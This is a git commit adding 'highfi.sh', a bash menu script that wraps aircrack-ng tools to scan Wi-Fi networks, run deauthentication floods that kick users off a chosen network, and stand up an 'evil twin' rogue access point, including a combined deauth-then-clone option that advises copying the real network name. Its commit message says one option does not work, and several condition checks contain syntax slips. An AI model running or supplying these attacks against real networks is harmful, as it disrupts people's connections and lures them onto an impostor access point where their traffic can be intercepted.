e4cbe6fe4a31bcf7b9b829f8fc6d83fd19283c65
threee3k <152722128+threee3k@users.noreply.github.com>
2023-12-02 12:40:10 -0500

    Add files via upload
    Tool is currently under construction, more attacks might be added, 4 doesn't work

---
+++ highfi.sh
@@ -0,0 +1,73 @@
+#! /bin/bash
+
+echo "Welcome to highfi"
+sleep 1
+echo "First off, type your wifi interface *iwconfig to find it*,"
+read INTER
+
+echo "Simple Wifi scan(1)"
+
+echo "Evil Twin attack(2)"
+
+echo "Deauth attack(3)"
+
+echo "Deauth attack+Capture handshake(4)"
+
+echo "Deauth attack+Evil Twin(5)"
+
+read ATTACKTY
+
+if [[ $ATTACKTY == '1' ]]
+then
+    sudo airodump-ng $INTER
+
+elif [[ $ATTACKTY == '2' ]]
+then
+    echo "A scan will be intiated, press CTRL+C to stop it once you found the target"
+    sleep 3
+    sudo airodump-ng $INTER
+    echo "Enter target's BSSID"
+    echo "Enter Evil Twin's Name"
+    read BSSID
+    read NAMEW
+    sudo airbase-ng -a $BSSID  -e $NAMEW -c 6 wlan0
+    
+
+elif [[ $ATTACKTY == '3']]
+then
+    echo "This will launch a Deauthentication attack which will kick users out of a wifi network"
+    sleep 1
+    echo "A scan will be intiated, press CTRL+C to stop it once you found the target"
+    echo "Enter target's BSSID"
+    read BSSID3
+    sudo aireplay-ng --deauth 1000 -a $BSSID3 $INTER
+
+elif [[ $ATTACKTY == '4']]
+then  
+    echo "This is still under construction, sorry!"
+
+elif [[ $ATTACKTY == '5']]
+then
+    echo "This will launch a Deauth attack, then create an Evil Twin of a wifi"
+    echo "A scan will be intiated, press CTRL+C to stop it once you found the target"
+    sleep 2
+    sudo airodump-ng $INTER
+    echo "Enter target's BSSID"
+    echo "Enter Evil twin's wifi name(highly recommend using the real wifi name)"
+    read BSSID5
+    read EVNAME
+    sudo aireplay-ng --deauth 1000 -a $BSSID5 $INTER
+    sleep 1
+    sudo 
+    sudo airbase-ng -a $BSSID5  -e $EVNAME -c 6 $INTER
+
+
+
+
+
+
+
+else
+    echo "bruh"
+
+fi
